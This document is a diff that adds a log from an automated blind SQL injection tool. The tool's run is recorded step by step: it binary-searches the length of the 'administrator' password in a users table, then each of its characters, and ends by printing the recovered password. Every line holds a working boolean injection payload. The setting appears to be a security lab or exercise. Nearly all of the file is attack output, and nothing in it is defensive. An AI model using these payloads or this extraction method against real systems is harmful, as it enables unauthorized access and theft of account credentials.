@@ -1,0 +1,179 @@
+Starting get password length with binary search: 
+(1, 50, 100) ---> OPPOSITE : ' and length((select password from users where username='administrator')) > 50--+
+(1, 25, 49) ---> OPPOSITE : ' and length((select password from users where username='administrator')) > 25--+
+(1, 12, 24) ---> ' and length((select password from users where username='administrator')) > 12--+
+(13, 18, 24) ---> ' and length((select password from users where username='administrator')) > 18--+
+(19, 21, 24) ---> OPPOSITE : ' and length((select password from users where username='administrator')) > 21--+
+(19, 19, 20) ---> ' and length((select password from users where username='administrator')) > 19--+
+Get the length successfully ---> ' and length((select password from users where username='administrator')) = 20--+
+The password length is : 20
+Memory usage:            0.027557 MB 
+Peak memory usage:       0.095459 MB
+Finished get password length with binary search:  in 39.818222 seconds
+
+Starting get password data with binary search: 
+(0, 46, 93) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 1, 1)) > 80--+
+(0, 22, 45) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 1, 1)) > 54--+
+(0, 10, 21) ---> ' and ascii(substr((select password from users where username='administrator'), 1, 1)) > 42--+
+(11, 16, 21) ---> ' and ascii(substr((select password from users where username='administrator'), 1, 1)) > 48--+
+(17, 19, 21) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 1, 1)) > 51--+
+Get the char index successfully ---> ' and ascii(substr((select password from users where username='administrator'), 1, 1)) = 49--+
+Got the password : 1, and its length : 1
+
+(0, 46, 93) ---> ' and ascii(substr((select password from users where username='administrator'), 2, 1)) > 80--+
+(47, 70, 93) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 2, 1)) > 105--+
+(47, 58, 69) ---> ' and ascii(substr((select password from users where username='administrator'), 2, 1)) > 92--+
+(59, 64, 69) ---> ' and ascii(substr((select password from users where username='administrator'), 2, 1)) > 99--+
+(65, 67, 69) ---> ' and ascii(substr((select password from users where username='administrator'), 2, 1)) > 102--+
+(68, 68, 69) ---> ' and ascii(substr((select password from users where username='administrator'), 2, 1)) > 103--+
+Get the char index successfully ---> ' and ascii(substr((select password from users where username='administrator'), 2, 1)) = 104--+
+Got the password : 1h, and its length : 2
+
+(0, 46, 93) ---> ' and ascii(substr((select password from users where username='administrator'), 3, 1)) > 80--+
+(47, 70, 93) ---> ' and ascii(substr((select password from users where username='administrator'), 3, 1)) > 105--+
+(71, 82, 93) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 3, 1)) > 117--+
+(71, 76, 81) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 3, 1)) > 111--+
+(71, 73, 75) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 3, 1)) > 108--+
+(71, 71, 72) ---> ' and ascii(substr((select password from users where username='administrator'), 3, 1)) > 106--+
+Get the char index successfully ---> ' and ascii(substr((select password from users where username='administrator'), 3, 1)) = 107--+
+Got the password : 1hk, and its length : 3
+
+(0, 46, 93) ---> ' and ascii(substr((select password from users where username='administrator'), 4, 1)) > 80--+
+(47, 70, 93) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 4, 1)) > 105--+
+(47, 58, 69) ---> ' and ascii(substr((select password from users where username='administrator'), 4, 1)) > 92--+
+(59, 64, 69) ---> ' and ascii(substr((select password from users where username='administrator'), 4, 1)) > 99--+
+(65, 67, 69) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 4, 1)) > 102--+
+(65, 65, 66) ---> ' and ascii(substr((select password from users where username='administrator'), 4, 1)) > 100--+
+Get the char index successfully ---> ' and ascii(substr((select password from users where username='administrator'), 4, 1)) = 101--+
+Got the password : 1hke, and its length : 4
+
+(0, 46, 93) ---> ' and ascii(substr((select password from users where username='administrator'), 5, 1)) > 80--+
+(47, 70, 93) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 5, 1)) > 105--+
+(47, 58, 69) ---> ' and ascii(substr((select password from users where username='administrator'), 5, 1)) > 92--+
+(59, 64, 69) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 5, 1)) > 99--+
+(59, 61, 63) ---> ' and ascii(substr((select password from users where username='administrator'), 5, 1)) > 96--+
+(62, 62, 63) ---> ' and ascii(substr((select password from users where username='administrator'), 5, 1)) > 97--+
+Get the char index successfully ---> ' and ascii(substr((select password from users where username='administrator'), 5, 1)) = 98--+
+Got the password : 1hkeb, and its length : 5
+
+(0, 46, 93) ---> ' and ascii(substr((select password from users where username='administrator'), 6, 1)) > 80--+
+(47, 70, 93) ---> ' and ascii(substr((select password from users where username='administrator'), 6, 1)) > 105--+
+(71, 82, 93) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 6, 1)) > 117--+
+(71, 76, 81) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 6, 1)) > 111--+
+(71, 73, 75) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 6, 1)) > 108--+
+(71, 71, 72) ---> ' and ascii(substr((select password from users where username='administrator'), 6, 1)) > 106--+
+Get the char index successfully ---> ' and ascii(substr((select password from users where username='administrator'), 6, 1)) = 107--+
+Got the password : 1hkebk, and its length : 6
+
+(0, 46, 93) ---> ' and ascii(substr((select password from users where username='administrator'), 7, 1)) > 80--+
+(47, 70, 93) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 7, 1)) > 105--+
+(47, 58, 69) ---> ' and ascii(substr((select password from users where username='administrator'), 7, 1)) > 92--+
+(59, 64, 69) ---> ' and ascii(substr((select password from users where username='administrator'), 7, 1)) > 99--+
+Get the char index successfully ---> ' and ascii(substr((select password from users where username='administrator'), 7, 1)) = 102--+
+Got the password : 1hkebkf, and its length : 7
+
+(0, 46, 93) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 8, 1)) > 80--+
+Get the char index successfully ---> ' and ascii(substr((select password from users where username='administrator'), 8, 1)) = 54--+
+Got the password : 1hkebkf6, and its length : 8
+
+(0, 46, 93) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 9, 1)) > 80--+
+(0, 22, 45) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 9, 1)) > 54--+
+(0, 10, 21) ---> ' and ascii(substr((select password from users where username='administrator'), 9, 1)) > 42--+
+(11, 16, 21) ---> ' and ascii(substr((select password from users where username='administrator'), 9, 1)) > 48--+
+(17, 19, 21) ---> ' and ascii(substr((select password from users where username='administrator'), 9, 1)) > 51--+
+Get the char index successfully ---> ' and ascii(substr((select password from users where username='administrator'), 9, 1)) = 52--+
+Got the password : 1hkebkf64, and its length : 9
+
+(0, 46, 93) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 10, 1)) > 80--+
+(0, 22, 45) ---> ' and ascii(substr((select password from users where username='administrator'), 10, 1)) > 54--+
+(23, 34, 45) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 10, 1)) > 68--+
+(23, 28, 33) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 10, 1)) > 61--+
+(23, 25, 27) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 10, 1)) > 57--+
+(23, 23, 24) ---> ' and ascii(substr((select password from users where username='administrator'), 10, 1)) > 55--+
+Get the char index successfully ---> ' and ascii(substr((select password from users where username='administrator'), 10, 1)) = 56--+
+Got the password : 1hkebkf648, and its length : 10
+
+(0, 46, 93) ---> ' and ascii(substr((select password from users where username='administrator'), 11, 1)) > 80--+
+(47, 70, 93) ---> ' and ascii(substr((select password from users where username='administrator'), 11, 1)) > 105--+
+(71, 82, 93) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 11, 1)) > 117--+
+(71, 76, 81) ---> ' and ascii(substr((select password from users where username='administrator'), 11, 1)) > 111--+
+(77, 79, 81) ---> ' and ascii(substr((select password from users where username='administrator'), 11, 1)) > 114--+
+(80, 80, 81) ---> ' and ascii(substr((select password from users where username='administrator'), 11, 1)) > 115--+
+Get the char index successfully ---> ' and ascii(substr((select password from users where username='administrator'), 11, 1)) = 116--+
+Got the password : 1hkebkf648t, and its length : 11
+
+(0, 46, 93) ---> ' and ascii(substr((select password from users where username='administrator'), 12, 1)) > 80--+
+(47, 70, 93) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 12, 1)) > 105--+
+(47, 58, 69) ---> ' and ascii(substr((select password from users where username='administrator'), 12, 1)) > 92--+
+(59, 64, 69) ---> ' and ascii(substr((select password from users where username='administrator'), 12, 1)) > 99--+
+(65, 67, 69) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 12, 1)) > 102--+
+Get the char index successfully ---> ' and ascii(substr((select password from users where username='administrator'), 12, 1)) = 100--+
+Got the password : 1hkebkf648td, and its length : 12
+
+(0, 46, 93) ---> ' and ascii(substr((select password from users where username='administrator'), 13, 1)) > 80--+
+(47, 70, 93) ---> ' and ascii(substr((select password from users where username='administrator'), 13, 1)) > 105--+
+Get the char index successfully ---> ' and ascii(substr((select password from users where username='administrator'), 13, 1)) = 117--+
+Got the password : 1hkebkf648tdu, and its length : 13
+
+(0, 46, 93) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 14, 1)) > 80--+
+(0, 22, 45) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 14, 1)) > 54--+
+(0, 10, 21) ---> ' and ascii(substr((select password from users where username='administrator'), 14, 1)) > 42--+
+(11, 16, 21) ---> ' and ascii(substr((select password from users where username='administrator'), 14, 1)) > 48--+
+(17, 19, 21) ---> ' and ascii(substr((select password from users where username='administrator'), 14, 1)) > 51--+
+(20, 20, 21) ---> ' and ascii(substr((select password from users where username='administrator'), 14, 1)) > 52--+
+Get the char index successfully ---> ' and ascii(substr((select password from users where username='administrator'), 14, 1)) = 53--+
+Got the password : 1hkebkf648tdu5, and its length : 14
+
+(0, 46, 93) ---> ' and ascii(substr((select password from users where username='administrator'), 15, 1)) > 80--+
+(47, 70, 93) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 15, 1)) > 105--+
+(47, 58, 69) ---> ' and ascii(substr((select password from users where username='administrator'), 15, 1)) > 92--+
+(59, 64, 69) ---> ' and ascii(substr((select password from users where username='administrator'), 15, 1)) > 99--+
+(65, 67, 69) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 15, 1)) > 102--+
+(65, 65, 66) ---> ' and ascii(substr((select password from users where username='administrator'), 15, 1)) > 100--+
+Get the char index successfully ---> ' and ascii(substr((select password from users where username='administrator'), 15, 1)) = 101--+
+Got the password : 1hkebkf648tdu5e, and its length : 15
+
+(0, 46, 93) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 16, 1)) > 80--+
+(0, 22, 45) ---> ' and ascii(substr((select password from users where username='administrator'), 16, 1)) > 54--+
+(23, 34, 45) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 16, 1)) > 68--+
+(23, 28, 33) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 16, 1)) > 61--+
+(23, 25, 27) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 16, 1)) > 57--+
+(23, 23, 24) ---> ' and ascii(substr((select password from users where username='administrator'), 16, 1)) > 55--+
+Get the char index successfully ---> ' and ascii(substr((select password from users where username='administrator'), 16, 1)) = 56--+
+Got the password : 1hkebkf648tdu5e8, and its length : 16
+
+(0, 46, 93) ---> ' and ascii(substr((select password from users where username='administrator'), 17, 1)) > 80--+
+(47, 70, 93) ---> ' and ascii(substr((select password from users where username='administrator'), 17, 1)) > 105--+
+(71, 82, 93) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 17, 1)) > 117--+
+(71, 76, 81) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 17, 1)) > 111--+
+Get the char index successfully ---> ' and ascii(substr((select password from users where username='administrator'), 17, 1)) = 108--+
+Got the password : 1hkebkf648tdu5e8l, and its length : 17
+
+(0, 46, 93) ---> ' and ascii(substr((select password from users where username='administrator'), 18, 1)) > 80--+
+(47, 70, 93) ---> ' and ascii(substr((select password from users where username='administrator'), 18, 1)) > 105--+
+(71, 82, 93) ---> ' and ascii(substr((select password from users where username='administrator'), 18, 1)) > 117--+
+(83, 88, 93) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 18, 1)) > 123--+
+Get the char index successfully ---> ' and ascii(substr((select password from users where username='administrator'), 18, 1)) = 120--+
+Got the password : 1hkebkf648tdu5e8lx, and its length : 18
+
+(0, 46, 93) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 19, 1)) > 80--+
+(0, 22, 45) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 19, 1)) > 54--+
+(0, 10, 21) ---> ' and ascii(substr((select password from users where username='administrator'), 19, 1)) > 42--+
+Get the char index successfully ---> ' and ascii(substr((select password from users where username='administrator'), 19, 1)) = 48--+
+Got the password : 1hkebkf648tdu5e8lx0, and its length : 19
+
+(0, 46, 93) ---> ' and ascii(substr((select password from users where username='administrator'), 20, 1)) > 80--+
+(47, 70, 93) ---> ' and ascii(substr((select password from users where username='administrator'), 20, 1)) > 105--+
+(71, 82, 93) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 20, 1)) > 117--+
+(71, 76, 81) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 20, 1)) > 111--+
+(71, 73, 75) ---> OPPOSITE : ' and ascii(substr((select password from users where username='administrator'), 20, 1)) > 108--+
+(71, 71, 72) ---> ' and ascii(substr((select password from users where username='administrator'), 20, 1)) > 106--+
+Get the char index successfully ---> ' and ascii(substr((select password from users where username='administrator'), 20, 1)) = 107--+
+Got the password : 1hkebkf648tdu5e8lx0k, and its length : 20
+
+The final password is : 1hkebkf648tdu5e8lx0k
+Memory usage:            0.006935 MB 
+Peak memory usage:       0.074337 MB
+Finished get password data with binary search:  in 546.722004 seconds
+
+🎉
